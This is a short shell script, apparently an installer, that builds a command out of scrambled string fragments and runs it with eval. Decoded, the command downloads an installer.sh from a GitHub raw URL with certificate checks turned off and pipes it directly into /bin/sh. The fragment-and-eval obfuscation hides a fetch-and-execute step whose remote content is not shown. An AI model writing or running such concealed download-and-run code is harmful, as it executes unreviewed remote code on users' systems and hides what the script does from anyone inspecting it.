z="
";az='- | ';Vz='ain/';Oz='onte';Mz='hubu';Az='wget';Ez='eck-';Tz='ptos';cz='/sh';Wz='inst';Cz='"--n';Nz='serc';Fz='cert';Zz=' -O ';Pz='nt.c';Xz='alle';Dz='o-ch';Sz='37/i';Hz='ate"';Kz='/raw';Yz='r.sh';Iz=' htt';Qz='om/e';Bz=' -q ';bz='/bin';Uz='at/m';Gz='ific';Rz='mil2';Lz='.git';Jz='ps:/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz"